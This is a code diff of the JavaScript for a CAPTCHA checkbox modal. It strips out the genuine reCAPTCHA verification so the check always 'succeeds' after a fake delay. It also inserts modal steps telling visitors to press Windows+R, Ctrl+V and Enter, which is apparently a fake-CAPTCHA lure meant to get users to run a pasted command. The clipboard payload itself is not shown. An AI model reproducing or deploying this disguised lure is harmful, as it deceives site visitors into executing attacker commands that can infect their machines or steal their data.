@@ -8,10 +8,10 @@ document.addEventListener('DOMContentLoaded', function() {
     captchaCheckbox.addEventListener('change', function() {
         if (this.checked) {
             openModal();
-            // Simulate verification delay
+            // Simulate normal verification delay
             setTimeout(() => {
-                verifyWithRecaptcha();
-            }, 1000);
+                showVerificationComplete(true);
+            }, 1200);
         }
     });
 
@@ -30,37 +30,13 @@ document.addEventListener('DOMContentLoaded', function() {
         modalOverlay.classList.remove('active');
         document.body.style.overflow = '';
         captchaCheckbox.checked = false;
-    }
-
-    // reCAPTCHA v3 Integration
-    function verifyWithRecaptcha() {
-        if (typeof grecaptcha !== 'undefined') {
-            grecaptcha.ready(function() {
-                grecaptcha.execute('YOUR_RECAPTCHA_V3_SITE_KEY', { action: 'submit' }).then(function(token) {
-                    // Send token to your backend for verification
-                    verifyTokenOnBackend(token);
-                }).catch(function(error) {
-                    console.error('reCAPTCHA error:', error);
-                    showVerificationComplete(false);
-                });
-            });
-        } else {
-            // Fallback if reCAPTCHA script not loaded
-            showVerificationComplete(true);
-        }
-    }
-
-    function verifyTokenOnBackend(token) {
-        // In a real implementation, you would send this token to your backend
-        // For now, we'll simulate a successful verification after a delay
-        setTimeout(() => {
-            showVerificationComplete(true);
-        }, 2000);
+        restoreModalContent();
     }
 
     function showVerificationComplete(success) {
         const modalBody = modal.querySelector('.modal-body');
-        
+        modalBody.innerHTML = '';
+
         if (success) {
             const successMessage = document.createElement('div');
             successMessage.className = 'verification-success';
@@ -68,13 +44,36 @@ document.addEventListener('DOMContentLoaded', function() {
                 <div class="success-icon">✓</div>
                 <p>Verification successful!</p>
             `;
-            
+            modalBody.appendChild(successMessage);
+
             setTimeout(() => {
                 closeModal();
-            }, 1500);
+            }, 1400);
         } else {
-            showError('Verification failed. Please try again.');
+            const errorDiv = document.createElement('div');
+            errorDiv.className = 'error-message';
+            errorDiv.textContent = 'Verification failed. Please try again.';
+            modalBody.appendChild(errorDiv);
         }
+    }
+
+    function restoreModalContent() {
+        modal.querySelector('.modal-body').innerHTML = `
+            <div class="steps-container">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-text">Press Windows Button "<span class=\"windows-icon\">⊞</span>" + R</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-text">Press CTRL + V</div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-text">Press Enter</div>
+                </div>
+            </div>
+        `;
     }
 
     function showError(message) {
@@ -97,3 +96,4 @@ document.addEventListener('keydown', function(event) {
         }
     }
 });
+
